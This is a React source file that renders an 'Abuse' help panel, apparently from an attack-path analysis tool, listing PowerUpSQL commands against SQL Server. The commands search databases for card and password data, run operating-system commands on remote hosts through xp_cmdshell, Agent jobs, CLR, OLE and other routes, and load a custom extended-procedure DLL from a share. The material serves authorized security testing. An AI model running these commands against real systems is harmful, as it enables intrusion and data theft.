// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Link, Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                Scott Sutherland (
                <Link target='_blank' rel='noopener' href='https://twitter.com/_nullbind'>
                    @nullbind
                </Link>
                ) from NetSPI has authored PowerUpSQL, a PowerShell Toolkit for Attacking SQL Server. Major contributors
                include Antti Rantasaari, Eric Gruber (
                <Link target='_blank' rel='noopener' href='https://twitter.com/egru'>
                    @egru
                </Link>
                ), and Thomas Elling (
                <Link target='_blank' rel='noopener' href='https://github.com/thomaselling'>
                    @thomaselling
                </Link>
                ). Before executing any of the below commands, download PowerUpSQL and load it into your PowerShell
                instance. Get PowerUpSQL here:{' '}
                <Link target='_blank' rel='noopener' href='https://github.com/NetSPI/PowerUpSQL'>
                    https://github.com/NetSPI/PowerUpSQL
                </Link>
                .
            </Typography>

            <Typography variant='body1'>Finding Data</Typography>

            <Typography variant='body2'>Get a list of databases, sizes, and encryption status:</Typography>
            <Typography component={'pre'}>
                {'Get-SQLDatabaseThreaded –Verbose -Instance sqlserver\\instance –Threads 10 -NoDefaults'}
            </Typography>
            <Typography variant='body2'>Search columns and data for keywords:</Typography>
            <Typography component={'pre'}>
                {
                    'Get-SQLColumnSampleDataThreaded –Verbose -Instance sqlserver\\instance –Threads 10 –Keyword "card, password" –SampleSize 2 –ValidateCC -NoDefaults | ft -AutoSize'
                }
            </Typography>

            <Typography variant='body1'>Executing Commands</Typography>

            <Typography variant='body2'>
                Below are examples of PowerUpSQL functions that can be used to execute operating system commands on
                remote systems through SQL Server using different techniques. The level of access on the operating
                system will depend largely what privileges are provided to the service account. However, when domain
                accounts are configured to run SQL Server services, it is very common to see them configured with local
                administrator privileges.
            </Typography>
            <Typography variant='body2'>xp_cmdshell Execute Example:</Typography>
            <Typography component={'pre'}>
                {'Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>Agent Job Execution Examples:</Typography>
            <Typography component={'pre'}>
                {
                    'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\\windows\\temp\\test1.txt" -Instance sqlserver\\instance -username myuser -password mypassword'
                }
            </Typography>
            <Typography component={'pre'}>
                {
                    'Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command \'write-output "hello world" | out-file c:\\windows\\temp\\test2.txt\' -Sleep 20 -Instance sqlserver\\instance -username myuser -password mypassword'
                }
            </Typography>
            <Typography component={'pre'}>
                {
                    "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"
                }
            </Typography>
            <Typography component={'pre'}>
                {
                    "Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\test3.txt' -Instance sqlserver\\instance -username myuser -password mypassword"
                }
            </Typography>
            <Typography variant='body2'>Python Subsystem Execution:</Typography>
            <Typography component={'pre'}>
                {'Invoke-SQLOSPython -Verbose -Command "Whoami" -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>R subsystem Execution Example</Typography>
            <Typography component={'pre'}>
                {'Invoke-SQLOSR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>OLE Execution Example</Typography>
            <Typography component={'pre'}>
                {'Invoke-SQLOSOle -Verbose -Command "Whoami" -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>CLR Execution Example</Typography>
            <Typography component={'pre'}>
                {'Invoke-SQLOSCLR -Verbose -Command "Whoami" -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>Custom Extended Procedure Execution Example:</Typography>
            <Typography variant='body2'>1. Create a custom extended stored procedure.</Typography>
            <Typography component={'pre'}>
                {
                    'Create-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command "echo test > c:\\temp\\test.txt" -ExportName xp_test'
                }
            </Typography>
            <Typography variant='body2'>
                2. Host the test.dll on a share readable by the SQL Server service account.
            </Typography>
            <Typography component={'pre'}>
                {
                    "Get-SQLQuery -Verbose -Query \"sp_addextendedproc 'xp_test', '\\\\yourserver\\yourshare\\myxp.dll'\" -Instance sqlserver\\instance"
                }
            </Typography>
            <Typography variant='body2'>3. Run extended stored procedure</Typography>
            <Typography component={'pre'}>
                {'Get-SQLQuery -Verbose -Query "xp_test" -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>4. Remove extended stored procedure.</Typography>
            <Typography component={'pre'}>
                {'Get-SQLQuery -Verbose -Query "sp_dropextendedproc \'xp_test\'" -Instance sqlserver\\instance'}
            </Typography>
            <Typography variant='body2'>Author: Scott Sutherland</Typography>
        </>
    );
};

export default Abuse;
